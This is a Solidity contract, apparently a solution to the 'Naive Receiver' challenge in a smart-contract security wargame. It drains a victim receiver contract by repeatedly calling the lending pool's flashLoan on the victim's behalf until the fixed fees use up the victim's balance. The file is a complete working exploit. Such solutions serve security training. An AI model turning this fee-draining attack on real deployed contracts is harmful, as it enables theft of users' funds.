// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title NaiveReceiverAttacker
 * @author Yasaman (Jasmine) Abtahi
 */

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {

    using SafeMath for uint256;
    using Address for address payable;
    NaiveReceiverLenderPool pool;

    constructor(address payable _NaiveReceiverLenderPool) {
        pool = NaiveReceiverLenderPool(_NaiveReceiverLenderPool);
    }

    function attack(address payable naiveReceiver) public {
        
        // Borrow on behalf of the naive receiver contract until its balance is zero
        while(naiveReceiver.balance >= pool.fixedFee()) {
            pool.flashLoan(naiveReceiver, 0);
        }
    }
}

